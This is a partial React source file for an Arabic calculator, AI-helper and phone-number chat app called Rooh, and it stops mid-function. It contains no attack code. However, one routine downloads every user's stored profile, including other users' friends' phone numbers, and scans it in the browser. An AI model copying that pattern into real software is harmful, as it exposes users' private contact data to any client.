import React, { useState, useEffect, useRef, forwardRef, useImperativeHandle } from 'react';
import html2canvas from 'html2canvas';
import { jsPDF } from 'jspdf';
import { 
  Calculator, 
  ArrowLeftRight, 
  Scale, 
  BrainCircuit, 
  History, 
  Menu, 
  X,
  Upload,
  Send,
  Trash2,
  Moon,
  Sun,
  LayoutGrid,
  Code2,
  FlaskConical,
  MessageSquare,
  ChevronLeft,
  ChevronRight,
  Info,
  Camera,
  Instagram,
  Download,
  Share2,
  CheckCircle2,
  AlertCircle,
  Bell,
  Sparkles,
  CircleChevronUp,
  CircleChevronDown,
  ChevronUp,
  ChevronDown,
  Copy,
  CopyCheck,
  RefreshCw,
  Calendar,
  Users,
  Heart,
  Settings as SettingsIcon,
  Palette,
  Archive,
  CheckCheck,
  Check,
  Gift,
  BookText,
  FileText,
  AlignRight,
  AlignCenter,
  AlignLeft,
  ImagePlus,
  FileImage,
  Languages,
  PencilRuler,
  Plus,
  Image as ImageIcon,
  Music,
  Maximize2,
  Volume2,
  VolumeX,
  Volume,
  Volume1,
  Smile,
  ShieldCheck,
  Maximize,
  LogIn,
  LogOut,
  User,
  FolderKey,
  Mail,
  Phone,
  Shield,
  Edit3,
  ShieldAlert,
  MailOpen,
  HardDrive
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import ReactMarkdown from 'react-markdown';
import { useDropzone } from 'react-dropzone';
import { cn } from './lib/utils';
import { AdminPanel9865, ForensicPanel6532 } from './components/AdminPanels';

const isRTL = true;
import { getGeminiResponse } from './lib/gemini';
import { pushToOfflineQueue, syncOfflineQueue, firebaseFetchApkDownloadUrl, firebaseFetchApkSettings } from './lib/firebaseSync';
import { 
  HistoryItem, 
  AIMessage, 
  UnitType, 
  Unit,
  Nickname,
  CVData,
  Experience,
  Certificate,
  Language,
  ChatFriend,
  ChatMessage,
  UserFolder,
  UsageTip
} from './types';

// --- Constants ---
const generateId = () => Math.random().toString(36).substring(2, 11) + Date.now().toString(36);

// Persisent Device ID for user isolation
export const getDeviceId = () => {
  try {
    let id = localStorage.getItem('rouh_device_unique_id');
    if (!id) {
      id = 'device_' + Math.random().toString(36).substring(2, 10);
      localStorage.setItem('rouh_device_unique_id', id);
    }
    return id;
  } catch (e) {
    return 'device_fallback_' + Math.random().toString(36).substring(2, 10);
  }
};

const getBaseApiUrl = () => {
  // Use relative path so that Vercel uses its own secure server-side rewrites (vercel.json)
  return "";
};

const getShareOrigin = () => {
  try {
    const origin = window.location.origin;
    if (origin && !origin.startsWith('file://') && !origin.includes('localhost') && !origin.includes('127.0.0.1') && !origin.includes('-preview.vercel.app')) {
      return origin;
    }
  } catch (e) {}
  // النطاق الأساسي الإنتاجي للتثبيت كبديل آمن وموثوق لتجنب جدران تسجيل الدخول في روابط المعاينة
  return "https://smart-soul-app.vercel.app"; 
};

// Secret Obfuscation Helpers for Referral Integration
const obfuscateRefId = (val: string) => {
  if (!val) return '';
  try {
    const rawStr = unescape(encodeURIComponent(val));
    if (typeof btoa !== 'undefined') {
      return btoa(rawStr).replace(/=/g, '');
    }
    return Buffer.from(rawStr).toString('base64').replace(/=/g, '');
  } catch (e) {
    return val;
  }
};

const deobfuscateRefId = (val: string) => {
  if (!val) return '';
  try {
    let str = val;
    while (str.length % 4 !== 0) str += '=';
    if (typeof atob !== 'undefined') {
      return decodeURIComponent(escape(atob(str)));
    }
    return decodeURIComponent(escape(Buffer.from(str, 'base64').toString()));
  } catch (e) {
    return val;
  }
};

const TABS = [
  { id: 'calc', label: 'الحاسبة', icon: Calculator },
  { id: 'services', label: 'خدمات روح الذكية', icon: Sparkles },
  { id: 'tools', label: 'أدوات روح', icon: LayoutGrid },
  { id: 'ai', label: 'المنقذ الذكي', icon: BrainCircuit },
  { id: 'chat', label: 'دردشة روح', icon: MessageSquare },
];

const MASS_UNITS: Unit[] = [
  { label: 'جرام (g)', value: 'g', factor: 1 },
  { label: 'كيلوجرام (kg)', value: 'kg', factor: 1000 },
  { label: 'مليجرام (mg)', value: 'mg', factor: 0.001 },
  { label: 'طن (t)', value: 't', factor: 1000000 },
  { label: 'باوند (lb)', value: 'lb', factor: 453.592 },
  { label: 'أونصة (oz)', value: 'oz', factor: 28.3495 },
];

const VOLUME_UNITS: Unit[] = [
  { label: 'لتر (L)', value: 'l', factor: 1 },
  { label: 'مليليتر (ml)', value: 'ml', factor: 0.001 },
  { label: 'متر مكعب (m³)', value: 'm3', factor: 1000 },
  { label: 'جالون (gal)', value: 'gal', factor: 3.78541 },
];

const DISTANCE_UNITS: Unit[] = [
  { label: 'متر (m)', value: 'm', factor: 1 },
  { label: 'كيلومتر (km)', value: 'km', factor: 1000 },
  { label: 'سنتيمتر (cm)', value: 'cm', factor: 0.01 },
  { label: 'مليمتر (mm)', value: 'mm', factor: 0.001 },
  { label: 'ميل (mi)', value: 'mi', factor: 1609.34 },
  { label: 'قدم (ft)', value: 'ft', factor: 0.3048 },
  { label: 'بوصة (in)', value: 'in', factor: 0.0254 },
];

// --- Sub-components ---

// 0. Rooh AI Loader Component
const RoohLoader = ({ size = 60, className = "" }: { size?: number, className?: string }) => {
  return (
    <div className={cn("relative flex items-center justify-center", className)} style={{ width: size, height: size }}>
      <motion.div
        animate={{ 
          rotateY: [0, 180, 360],
          scale: [1, 1.05, 1],
          filter: ["brightness(1) drop-shadow(0 0 5px rgba(59,130,246,0.3))", "brightness(1.2) drop-shadow(0 0 15px rgba(59,130,246,0.6))", "brightness(1) drop-shadow(0 0 5px rgba(59,130,246,0.3))"]
        }}
        transition={{ 
          duration: 4, 
          repeat: Infinity, 
          ease: "easeInOut" 
        }}
        className="relative w-full h-full rounded-full overflow-hidden border border-blue-500/30"
      >
        <img 
          src="https://lh3.googleusercontent.com/d/1p79NP1wGo5nAmDpGLV3xHvWbC1DJfZdZ" 
          alt="Rooh AI" 
          className="w-full h-full object-cover"
          style={{ transform: 'scale(1.5) translateY(-10%)' }} // Crop bottom text
          referrerPolicy="no-referrer"
        />
        <div className="absolute inset-0 bg-gradient-to-t from-blue-600/20 to-transparent pointer-events-none" />
      </motion.div>
      <motion.div 
        animate={{ scale: [1, 1.2, 1], opacity: [0.3, 0.6, 0.3] }}
        transition={{ duration: 2, repeat: Infinity }}
        className="absolute inset-0 rounded-full bg-blue-400 blur-xl -z-10"
      />
    </div>
  );
};

// 0. Circular Progress Component
const CircularProgress = ({ progress, size = 32, strokeWidth = 3, color = "text-blue-500" }: { progress: number, size?: number, strokeWidth?: number, color?: string }) => {
  const radius = (size - strokeWidth) / 2;
  const circumference = radius * 2 * Math.PI;
  const offset = circumference - (progress / 100) * circumference;

  return (
    <div className="relative" style={{ width: size, height: size }}>
      <svg className="rotate-[-90deg]" width={size} height={size}>
        <circle
          className="text-gray-800"
          strokeWidth={strokeWidth}
          stroke="currentColor"
          fill="transparent"
          r={radius}
          cx={size / 2}
          cy={size / 2}
        />
        <circle
          className={cn(color, "transition-all duration-300 ease-out")}
          strokeWidth={strokeWidth}
          strokeDasharray={circumference}
          strokeDashoffset={offset}
          strokeLinecap="round"
          stroke="currentColor"
          fill="transparent"
          r={radius}
          cx={size / 2}
          cy={size / 2}
        />
      </svg>
      <div className="absolute inset-0 flex items-center justify-center">
        <span className="text-[8px] font-black">{Math.round(progress)}%</span>
      </div>
    </div>
  );
};

// 0. Custom Notification UI (Toast)
interface ToastProps {
  message: string;
  type: 'success' | 'error' | 'info';
  onClose: () => void;
}

const Toast = ({ message, type, onClose }: ToastProps) => {
  useEffect(() => {
    const timer = setTimeout(onClose, 4000);
    return () => clearTimeout(timer);
  }, [onClose]);

  const icons = {
    success: <CheckCircle2 size={20} className="text-emerald-500 dark:text-emerald-400" />,
    error: <AlertCircle size={20} className="text-blue-500 dark:text-red-400" />,
    info: <Bell size={20} className="text-blue-500 dark:text-white" />
  };

  const bgColors = {
    success: "bg-white dark:bg-black border-blue-500/20 dark:border-emerald-500/30",
    error: "bg-white dark:bg-black border-blue-500/20 dark:border-red-500/30",
    info: "bg-white dark:bg-black border-blue-500/20 dark:border-white/10"
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 20, scale: 0.9 }}
      animate={{ opacity: 1, y: 0, scale: 1 }}
      exit={{ opacity: 0, scale: 0.9, y: -20 }}
      className={cn(
        "fixed bottom-24 left-4 right-4 sm:left-auto sm:right-6 sm:w-80 p-5 rounded-3xl border shadow-2xl z-[100] backdrop-blur-xl flex items-center gap-4 transition-all",
        bgColors[type]
      )}
    >
      <div className="shrink-0">{icons[type]}</div>
      <p className={cn(
        "text-[11px] font-black italic flex-1",
        type === 'success' ? "text-blue-600 dark:text-emerald-400" :
        type === 'error' ? "text-blue-600 dark:text-red-400" :
        "text-blue-600 dark:text-white"
      )}>
        {message}
      </p>
      <button onClick={onClose} className="p-1 text-gray-400 hover:text-blue-500 dark:hover:text-white transition-colors">
        <X size={16} />
      </button>
    </motion.div>
  );
};

// 0.1 Permission Modal UI
interface PermissionModalProps {
  onConfirm: () => void;
  onCancel: () => void;
}

const PermissionModal = ({ onConfirm, onCancel }: PermissionModalProps) => {
  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-[110] flex items-center justify-center bg-black/80 backdrop-blur-sm p-6"
      onClick={onCancel}
    >
      <motion.div 
        initial={{ scale: 0.9, y: 20 }}
        animate={{ scale: 1, y: 0 }}
        exit={{ scale: 0.9, y: 20 }}
        onClick={(e) => e.stopPropagation()}
        className="bg-white dark:bg-[#121417] border border-gray-200 dark:border-gray-800 rounded-3xl p-6 w-full max-w-sm shadow-2xl"
      >
        <div className="w-16 h-16 bg-blue-600/20 rounded-2xl flex items-center justify-center mb-4 mx-auto">
          <Camera size={32} className="text-blue-600 dark:text-blue-500" />
        </div>
        <h3 className="text-lg font-black text-center text-gray-900 dark:text-white mb-2 italic">إذن استخدام الكاميرا</h3>
        <p className="text-xs text-gray-500 dark:text-gray-400 text-center mb-6 leading-relaxed">
          نحتاج للوصول إلى الكاميرا للسماح لك بالتقاط صور للمسائل مباشرة ليقوم "روح" بحلها لك فوراً.
        </p>
        <div className="flex flex-col gap-2">
          <button 
            type="button"
            onClick={onConfirm}
            className="w-full bg-blue-600 hover:bg-blue-500 py-3 rounded-xl font-bold text-white transition-all active:scale-95"
          >
            السماح الآن
          </button>
          <button 
            type="button"
            onClick={onCancel}
            className="w-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700 py-3 rounded-xl font-bold text-gray-500 dark:text-gray-400 transition-all active:scale-95"
          >
            ليس الآن
          </button>
        </div>
      </motion.div>
    </motion.div>
  );
};

// 0.2 Confirmation Modal UI
interface ConfirmationModalProps {
  title: string;
  message: string;
  onConfirm: () => void;
  onCancel: () => void;
  confirmLabel?: string;
  cancelLabel?: string;
  variant?: 'danger' | 'info';
}

const ConfirmationModal = ({ 
  title, 
  message, 
  onConfirm, 
  onCancel, 
  confirmLabel = 'تأكيد', 
  cancelLabel = 'إلغاء',
  variant = 'info' 
}: ConfirmationModalProps) => {
  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-[110] flex items-center justify-center bg-black/80 backdrop-blur-sm p-6"
      onClick={onCancel}
    >
      <motion.div 
        initial={{ scale: 0.9, y: 20 }}
        animate={{ scale: 1, y: 0 }}
        exit={{ scale: 0.9, y: 20 }}
        onClick={(e) => e.stopPropagation()}
        className="bg-white dark:bg-[#121417] border border-gray-200 dark:border-gray-800 rounded-3xl p-6 w-full max-w-sm shadow-2xl"
      >
        <h3 className="text-lg font-black text-center text-gray-900 dark:text-white mb-2 italic">{title}</h3>
        <p className="text-xs text-gray-500 dark:text-gray-400 text-center mb-6 leading-relaxed">
          {message}
        </p>
        <div className="flex gap-3">
          <button 
            type="button"
            onClick={onConfirm}
            className={cn(
              "flex-1 py-3 rounded-xl font-bold text-white transition-all active:scale-95",
              variant === 'danger' ? "bg-red-600 hover:bg-red-500" : "bg-blue-600 hover:bg-blue-500"
            )}
          >
            {confirmLabel}
          </button>
          <button 
            type="button"
            onClick={onCancel}
            className="flex-1 bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700 py-3 rounded-xl font-bold text-gray-500 dark:text-gray-400 transition-all active:scale-95"
          >
            {cancelLabel}
          </button>
        </div>
      </motion.div>
    </motion.div>
  );
};

// 0.2.1 Image Source Picker UI
const ImageSourcePicker = ({ onSelect, onClose }: { onSelect: (source: 'camera' | 'gallery') => void, onClose: () => void }) => {
  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-[120] flex items-end sm:items-center justify-center bg-black/60 backdrop-blur-sm p-4"
      onClick={onClose}
    >
      <motion.div 
        initial={{ y: "100%" }}
        animate={{ y: 0 }}
        exit={{ y: "100%" }}
        onClick={(e) => e.stopPropagation()}
        className="bg-white dark:bg-[#121417] border border-gray-200 dark:border-gray-800 rounded-t-3xl sm:rounded-3xl p-6 w-full max-w-sm shadow-2xl space-y-4"
      >
        <div className="text-center space-y-1 mb-2">
          <h3 className="text-lg font-black text-gray-900 dark:text-white italic">إضافة صورة</h3>
          <p className="text-[10px] text-gray-400 dark:text-gray-500 font-bold uppercase tracking-wider">اختر مصدر الصورة المناسب لك</p>
        </div>
        
        <div className="grid grid-cols-2 gap-3">
          <button 
            onClick={() => { onClose(); onSelect('camera'); }}
            className="flex flex-col items-center gap-3 p-6 bg-blue-600/5 dark:bg-blue-600/10 border border-blue-200 dark:border-blue-500/20 rounded-2xl hover:bg-blue-600/20 transition-all group"
          >
            <Camera size={32} className="text-blue-600 dark:text-blue-500 group-hover:scale-110 transition-transform" />
            <span className="text-xs font-black text-gray-900 dark:text-white">فتح الكاميرا</span>
          </button>
          
          <button 
            onClick={() => { onClose(); onSelect('gallery'); }}
            className="flex flex-col items-center gap-3 p-6 bg-emerald-600/5 dark:bg-emerald-600/10 border border-emerald-200 dark:border-emerald-500/20 rounded-2xl hover:bg-emerald-600/20 transition-all group"
          >
            <ImagePlus size={32} className="text-emerald-600 dark:text-emerald-500 group-hover:scale-110 transition-transform" />
            <span className="text-xs font-black text-gray-900 dark:text-white">من الوسائط</span>
          </button>
        </div>
        
        <button 
          onClick={onClose}
          className="w-full py-3 text-gray-500 text-xs font-bold hover:text-gray-900 dark:hover:text-white transition-colors"
        >
          تراجع
        </button>
      </motion.div>
    </motion.div>
  );
};

// 0.3 Secret Gallery Component
const SmartChatTab = ({ 
  userPhone,
  setUserPhone,
  friends,
  setFriends,
  showToast,
  addBackgroundTask,
  onSmartTrigger,
  onPermissionRequest,
  initialTargetFriend,
  notifications,
  setNotifications,
  showLocalNotification
}: { 
  userPhone: string | null;
  setUserPhone: (p: string | null) => void;
  friends: ChatFriend[];
  setFriends: (f: ChatFriend[]) => void;
  showToast: (msg: string, type: 'success' | 'error' | 'info') => void;
  addBackgroundTask: (label: string, taskFn: () => Promise<any>, target?: {tab: string, subTab?: string}) => Promise<void>;
  onSmartTrigger: (type?: 's' | 't', source?: string) => void;
  onPermissionRequest: () => Promise<boolean>;
  initialTargetFriend?: ChatFriend | null;
  notifications: any[];
  setNotifications: React.Dispatch<React.SetStateAction<any[]>>;
  showLocalNotification: (title: string, body: string, iconUrl?: string) => void;
}) => {
  const [activeSubTab, setActiveSubTab] = useState<'inbox' | 'sent' | 'friends' | 'blocked'>('friends');
  const [isAddFriendOpen, setIsAddFriendOpen] = useState(false);
  const [selectedFriend, setSelectedFriend] = useState<ChatFriend | null>(initialTargetFriend || null);
  const [friendMenuOpen, setFriendMenuOpen] = useState<ChatFriend | null>(null);
  const [blockedPhones, setBlockedPhones] = useState<string[]>(() => {
    try {
      const saved = localStorage.getItem('rouh_blocked_phones');
      return saved ? Array.from(new Set(JSON.parse(saved))) : [];
    } catch (e) { return []; }
  });
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [loading, setLoading] = useState(false);
  const [newFriend, setNewFriend] = useState({ name: '', phone: '', codes: [] as string[] });
  const [chatInput, setChatInput] = useState('');
  const [attachedMedia, setAttachedMedia] = useState<{ data: string, name: string, type: 'image' | 'video' } | null>(null);
  const [uploadProgress, setUploadProgress] = useState<number | null>(null);
  const [fullscreenMedia, setFullscreenMedia] = useState<string | null>(null);
  const [friendStatuses, setFriendStatuses] = useState<Record<string, string>>({});
  
  const [showAppeal, setShowAppeal] = useState(false);
  const [appealForm, setAppealForm] = useState({ name: '', email: '', phone: '', reason: '' });
  const [registrationMode, setRegistrationMode] = useState<'normal' | 'appeal' | 'complaint'>('normal');

  const fileInputRef = useRef<HTMLInputElement>(null);
  const cameraInputRef = useRef<HTMLInputElement>(null);

  const handleSelectFriend = async (friend: ChatFriend) => {
    if (!userPhone) return;

    // Fast check if friend blocked me
    try {
      const res = await fetch(`/api/chat/check-blocked/${userPhone}/${friend.phone}`);
      if (res.ok) {
        const data = await res.json();
        if (data.blocked) {
          showToast('⚠️ عذرًا! لقد قام هذا المستخدم بحظرك ولا يمكنك مراسلته.', 'error');
          return;
        }
      }
    } catch (e) {
      console.warn("Failed block check:", e);
    }

    // Mark messages as read!
    try {
      await fetch('/api/chat/mark-read', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ from: friend.phone, to: userPhone })
      });
      refreshMessages();
    } catch (e) {}

    setSelectedFriend(friend);
  };

  useEffect(() => {
    if (initialTargetFriend) {
      handleSelectFriend(initialTargetFriend);
    }
  }, [initialTargetFriend]);

  const refreshMessages = async () => {
    if (!userPhone) return;

    // 1. OFFLINE CACHE RESTORATION FLOW
    if (typeof navigator !== 'undefined' && !navigator.onLine) {
      try {
        const cached = localStorage.getItem(`rouh_chat_history_${userPhone}`);
        if (cached) {
          const parsed = JSON.parse(cached);
          setMessages(parsed);
        }
      } catch (err) {}
      return;
    }

    try {
      const inboxRes = await fetch(`/api/chat/inbox/${userPhone}`);
      const sentRes = await fetch(`/api/chat/sent/${userPhone}`);
      
      const inboxData = inboxRes.ok ? await inboxRes.json() : [];
      const sentData = sentRes.ok ? await sentRes.json() : [];
      
      const combined = [...inboxData, ...sentData];
      const uniqueMap = new Map();
      combined.forEach((m: any) => {
        if (!uniqueMap.has(m.id)) {
          uniqueMap.set(m.id, m);
        }
      });
      
      const all = Array.from(uniqueMap.values()).sort((a: any, b: any) => 
        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
      );

      // 2. DETECT NEW INCOMING MESSAGES FOR SYSTEM AND IN-APP ALERTS
      if (messages && messages.length > 0) {
        const currentIds = new Set(messages.map(m => m.id));
        const newIncoming = all.filter((m: any) => !currentIds.has(m.id) && m.from !== userPhone);
        
        if (newIncoming.length > 0) {
          newIncoming.forEach((msg: any) => {
            const senderFriend = friends.find(f => f.phone === msg.from);
            const senderLabel = senderFriend ? senderFriend.name : `الرقم ${msg.from}`;
            
            // Add to In-App Notification Center
            const newNotif = {
              id: msg.id || generateId(),
              type: 'new_message',
              title: `رسالة جديدة من ${senderLabel} 💬`,
              body: msg.text ? (msg.text.length > 70 ? msg.text.substring(0, 67) + '...' : msg.text) : 'أرسل لك ملف وسائط مشارك',
              timestamp: msg.timestamp || new Date().toISOString(),
              read: false
            };
            
            setNotifications(prev => {
              const exists = prev.some(n => n.id === newNotif.id);
              if (!exists) return [newNotif, ...prev];
              return prev;
            });

            // Fire native/background device notification
            showLocalNotification(
              `دردشة روح - من ${senderLabel} 💬`,
              msg.text || 'تلقيت ملف وسائط جديد.'
            );
          });
        }
      }
      
      setMessages(all);

      // Save to localStorage cache for complete offline access
      try {
        localStorage.setItem(`rouh_chat_history_${userPhone}`, JSON.stringify(all));
      } catch (cacheErr) {}

      // Trigger background notification/friend addition sync
      syncFirebaseNotifications();
      syncWhoAddedMeAsFriend();

    } catch (e) {
      console.error("Failed to fetch messages", e);
      // Fail gracefully: restore local cache if fetch fails completely
      try {
        const cached = localStorage.getItem(`rouh_chat_history_${userPhone}`);
        if (cached) {
          setMessages(JSON.parse(cached));
        }
      } catch (err) {}
    }
  };

  const syncFirebaseNotifications = async () => {
    if (!userPhone || (typeof navigator !== 'undefined' && !navigator.onLine)) return;
    try {
      const { firebaseFetchNotificationsForUser } = await import('./lib/firebaseSync');
      const firebaseNotifs = await firebaseFetchNotificationsForUser(userPhone);
      if (firebaseNotifs && firebaseNotifs.length > 0) {
        setNotifications(prev => {
          const updated = [...prev];
          firebaseNotifs.forEach((fn: any) => {
            const exists = updated.some(un => un.id === fn.id || (un.body === fn.message && Math.abs(new Date(un.timestamp).getTime() - fn.createdAt) < 300000));
            if (!exists) {
              const newNotif = {
                id: fn.id || generateId(),
                type: 'system',
                title: 'تنبيه من الإدارة ✨',
                body: fn.message,
                timestamp: new Date(fn.createdAt || Date.now()).toISOString(),
                read: false
              };
              updated.unshift(newNotif);
              showLocalNotification('روح الذكية - تنبيه إداري ✨', fn.message);
            }
          });
          return updated;
        });
      }
    } catch (e) {
      console.warn("Failed syncing notifications from Firebase", e);
    }
  };

  const syncWhoAddedMeAsFriend = async () => {
    if (!userPhone || (typeof navigator !== 'undefined' && !navigator.onLine)) return;
    try {
      const { firebaseFetchAllUserProfiles } = await import('./lib/firebaseSync');
      const allProfiles = await firebaseFetchAllUserProfiles();
      
      allProfiles.forEach((profile: any) => {
        const profileFriends = profile.friends || [];
        const addedMe = profileFriends.some((f: any) => f.phone === userPhone);
        
        if (addedMe) {
          const senderName = profile.usernameUnified || profile.name || 'عضو في روح';
          const senderPhone = profile.id;
          
          setNotifications(prev => {
            const key = `friend_add_${senderPhone}`;
            const exists = prev.some(n => n.id === key);
            if (!exists) {
              const newNotif = {
                id: key,
                type: 'friend_add',
                title: 'طلب صداقة جديد 🤝',
                body: `قام ${senderName} (${senderPhone}) بإضافتك إلى قائمة أصدقائه لحساب روح!`,
                timestamp: new Date().toISOString(),
                read: false
              };
              showLocalNotification('صديق جديد في روح 🤝', `قام ${senderName} بإضافتك لقائمة أصدقائه.`);
              return [newNotif, ...prev];
            }
            return prev;
          });
        }
      });
    } catch (e) {
      console.warn("Failed checking mutual additions", e);
    }
  };

  const refreshStatuses = async () => {
    const statuses: Record<string, string> = {};
    for (const f of friends) {
      try {
        const res = await fetch(`/api/chat/status/${f.phone}`);
        if (res.ok) {
          const data = await res.json();
          if (data.status === 'غير متصل') {
            // Further check if registered
            const regRes = await fetch(`/api/chat/check-status/${f.phone}`);
            const regData = await regRes.json();
            if (!regData.registered) {
              statuses[f.phone] = 'لم ينضم لروح بعد';
            } else {
              statuses[f.phone] = 'غير متصل';
            }
          } else {
            statuses[f.phone] = data.status;
          }
        }
      } catch (e) {}
    }
    setFriendStatuses(statuses);
  };

  useEffect(() => {
    refreshMessages();
    refreshStatuses();
    const timer = setInterval(() => {
      refreshMessages();
      refreshStatuses();
    }, 10000); // Polling every 10s for real-time feel
    return () => clearInterval(timer);
  }, [userPhone, friends]);

  useEffect(() => {
    localStorage.setItem('rouh_blocked_phones', JSON.stringify(blockedPhones));
  }, [blockedPhones]);

  const handleBlockFriend = async (phone: string) => {
    if (!userPhone) return;
    const safePhone = phone.replace(/[^0-9]/g, '');
    if (!blockedPhones.includes(safePhone)) {
      const updatedBlocked = [...blockedPhones, safePhone];
      setBlockedPhones(updatedBlocked);
      localStorage.setItem('rouh_blocked_phones', JSON.stringify(updatedBlocked));
      showToast('تم حظر هذا الرقم بنجاح 🚫', 'info');

      // Sync block list with server profile
      try {
        await fetch('/api/chat/block', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: userPhone, blockPhone: safePhone, action: 'block' })
        });
      } catch (err) {
        console.warn("Server block sync failed:", err);
      }
    }
    setFriendMenuOpen(null);
  };

  const handleUnblockFriend = async (phone: string) => {
    if (!userPhone) return;
    const safePhone = phone.replace(/[^0-9]/g, '');
    const updatedBlocked = blockedPhones.filter(p => p !== safePhone);
    setBlockedPhones(updatedBlocked);
    localStorage.setItem('rouh_blocked_phones', JSON.stringify(updatedBlocked));
    showToast('تم إلغاء الحظر بنجاح ✔️', 'success');

    // Sync block list with server profile
    try {
      await fetch('/api/chat/block', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: userPhone, blockPhone: safePhone, action: 'unblock' })
      });
    } catch (err) {
      console.warn("Server unblock sync failed:", err);
    }
  };

  const handleDeleteChatHistory = async (friendPhone: string) => {
    if (!userPhone) return;
    try {
      await fetch('/api/chat/delete-history', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ from: userPhone, to: friendPhone })
      });
      refreshMessages();
      showToast('تم مسح السجل بنجاح 🧹', 'success');
      setFriendMenuOpen(null);
    } catch (e) {}
  };

  const handleSendMessage = async (recipientPhone: string) => {
    if (!userPhone || (!chatInput.trim() && !attachedMedia)) return;

    if (attachedMedia) setUploadProgress(10);
    
    // OFFLINE QUEUEING & VISUALIZATION
    if (typeof navigator !== 'undefined' && !navigator.onLine) {
      try {
        const localMsgId = 'msg_local_' + Date.now();
        const localMsg: ChatMessage = {
          id: localMsgId,
          from: userPhone,
          to: recipientPhone,
          text: chatInput,
          type: attachedMedia ? attachedMedia.type : 'text',
          mediaUrl: attachedMedia?.data || '',
          timestamp: new Date().toISOString()
        };

        // Render message immediately
        setMessages(prev => [localMsg, ...prev]);
        setChatInput('');
        setAttachedMedia(null);
        setUploadProgress(null);
        showToast('تم حفظ الرسالة محلياً. سيتم إرسالها فور عودة الاتصال! 📡', 'info');

        // Queue for background syncing to Firebase
        pushToOfflineQueue('chat_message', localMsg);

        // Update local history cache
        const cached = localStorage.getItem(`rouh_chat_history_${userPhone}`);
        const chatList = cached ? JSON.parse(cached) : [];
        chatList.push(localMsg);
        localStorage.setItem(`rouh_chat_history_${userPhone}`, JSON.stringify(chatList));
      } catch (err) {
        showToast('فشل تعيين الرسالة المعلقة', 'error');
      }
      return;
    }

    try {
      if (attachedMedia) setUploadProgress(30);
      const res = await fetch('/api/chat/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          from: userPhone,
          to: recipientPhone,
          text: chatInput,
          type: attachedMedia ? attachedMedia.type : 'text',
          mediaData: attachedMedia?.data,
          fileName: attachedMedia?.name
        })
      });

      if (attachedMedia) setUploadProgress(100);

      if (res.ok) {
        setChatInput('');
        setAttachedMedia(null);
        setTimeout(() => setUploadProgress(null), 1000);
        refreshMessages();
      }
    } catch (e) {
      showToast('فشل إرسال الرسالة', 'error');
      setUploadProgress(null);
    }
  };

  const checkFriendStatus = async (phone: string) => {
    try {
      const res = await fetch(`/api/chat/check-status/${phone}`);
      if (res.ok) {
        const data = await res.json();
        return data; // { registered, name }
      }
    } catch (e) {
      console.warn("Proxy check status failed:", e);
    }

    // Direct Firestore fallback check!
    const { isFirebasePlaceholder } = await import('./lib/firebase');
    if (!isFirebasePlaceholder) {
      try {
        const { doc, getDoc, collection } = await import('firebase/firestore');
        const { db } = await import('./lib/firebase');
        const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
        const docSnap = await getDoc(doc(colRef, phone));
        if (docSnap.exists()) {
          const data = docSnap.data();
          return { registered: true, name: data.usernameUnified || data.name || "" };
        }
      } catch (err) {
        console.error("Direct Firestore check status failed:", err);
      }
    }
    return { registered: false };
  };

  const handleAddFriend = () => {
    if (!newFriend.name || !newFriend.phone) return;
    if (newFriend.phone.length < 9) {
      showToast('يا عزيزي، يجب ألا يقل رقم هاتف صديقك عن 9 أرقام لتتمكن من إضافته.', 'error');
      return;
    }

    const fName = newFriend.name;
    const fPhone = newFriend.phone.replace(/[^0-9]/g, '');
    const fCodes = newFriend.codes;

    // Close modal instantly
    setIsAddFriendOpen(false);

    const friend: ChatFriend = {
      id: generateId(),
      name: fName,
      phone: fPhone,
      accessCodes: fCodes
    };
    const updated = [...friends, friend];
    setFriends(updated);
    localStorage.setItem('friends', JSON.stringify(updated));
    setNewFriend({ name: '', phone: '', codes: [] });

    showToast('جاري إضافة الصديق والتحقق منه في الخلفية... ✨', 'success');

    // Proceed in background
    addBackgroundTask('مزامنة الصديق والتحقق بالخلفية', async () => {
      const status = await checkFriendStatus(fPhone);
      if (!status.registered) {
        showToast(`يا عزيزي، صديقك "${fName}" لم ينضم بعد لعائلة روح! شارك التطبيق معه وادعه للتسجيل الآن.`, 'info');
      } else {
        showToast(`رائع! صديقك "${fName}" مسجل بالفعل ومتواجد معنا في روح.`, 'success');
      }

      if (userPhone) {
        // Sync friends list with server profile
        try {
          await fetch('/api/chat/sync-profile', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              phone: userPhone,
              friends: updated.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes }))
            })
          });
        } catch (err) {
          console.warn("Background friend sync to profile failed:", err);
        }

        // Direct cloud sync fallback
        if (typeof navigator !== 'undefined' && navigator.onLine) {
          try {
            const { isFirebasePlaceholder } = await import('./lib/firebase');
            if (!isFirebasePlaceholder) {
              const { doc, updateDoc, collection } = await import('firebase/firestore');
              const { db } = await import('./lib/firebase');
              const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
              await updateDoc(doc(colRef, userPhone), {
                friends: updated.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes }))
              });
            }
          } catch (err) {
            console.warn("Cloud Firestore direct friend update failed:", err);
          }
        }
      }
    });
  };

  const handleRegister = () => {
    if (userPhone) {
      showToast('رقمك مسجل بالفعل ولا يمكن تغييره!', 'error');
      return;
    }
    if (!newFriend.name) {
      showToast('يرجى إدخال اسمك أولاً', 'error');
      return;
    }
